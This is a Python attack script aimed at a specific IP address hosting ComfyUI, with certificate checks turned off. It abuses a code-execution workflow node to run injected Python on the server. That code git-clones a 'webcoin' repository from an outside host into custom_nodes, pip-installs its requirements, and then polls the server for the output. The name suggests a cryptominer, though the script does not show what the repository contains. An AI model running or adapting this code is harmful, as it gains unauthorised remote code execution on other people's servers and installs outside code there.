import json, urllib.request, ssl, time

base = "https://160.85.252.207:443"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CLONE_CODE = r"""
import os, subprocess, sys, platform

cn = None
for p in sys.path:
    test = os.path.join(p, 'custom_nodes')
    if os.path.isdir(test):
        cn = test
        break
if cn is None:
    for base_try in ['/home/ubuntu/comfy/ComfyUI', '/app/ComfyUI', '/workspace/ComfyUI']:
        test = os.path.join(base_try, 'custom_nodes')
        if os.path.isdir(test):
            cn = test
            break

lines = []
lines.append('platform=' + platform.system())
lines.append('cn=' + str(cn))
target = os.path.join(cn, 'webcoin') if cn else None

if target and os.path.isdir(target):
    lines.append('already_exists=True')
    lines.append('files=' + str(sorted(os.listdir(target))[:15]))
elif target:
    r = subprocess.run(
        ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
        capture_output=True, text=True, timeout=120
    )
    lines.append('clone_rc=' + str(r.returncode))
    if r.stderr.strip():
        lines.append('stderr=' + r.stderr.strip()[:300])
    if os.path.isdir(target):
        lines.append('files=' + str(sorted(os.listdir(target))[:15]))
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r2.returncode))
            if r2.stderr.strip():
                lines.append('pip_err=' + r2.stderr.strip()[:200])
else:
    lines.append('ERROR: no custom_nodes found')

result = chr(10).join(lines)
"""

prompt_data = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CLONE_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
    },
    "extra_data": {"extra_pnginfo": {"workflow": {"nodes": [], "links": [], "extra": {}}}},
}

data = json.dumps(prompt_data).encode()
req = urllib.request.Request(f"{base}/prompt", data=data, headers={"Content-Type": "application/json"})
resp = urllib.request.urlopen(req, context=ctx, timeout=15)
pid = json.loads(resp.read()).get("prompt_id", "")
print(f"prompt_id: {pid}")

for i in range(12):
    time.sleep(10)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        resp2 = urllib.request.urlopen(req2, context=ctx, timeout=10)
        hist = json.loads(resp2.read())
        entry = hist.get(pid, {})
        status = entry.get("status", {}).get("status_str", "pending")
        print(f"  [{(i+1)*10}s] status={status}")
        if status in ("success", "error"):
            outputs = entry.get("outputs", {})
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        for item in val:
                            if isinstance(item, dict) and "text" in item:
                                for line in item["text"]:
                                    print(f"  {line}")
                            elif isinstance(item, str):
                                print(f"  {item}")
            break
    except Exception as e:
        print(f"  [{(i+1)*10}s] error: {e}")
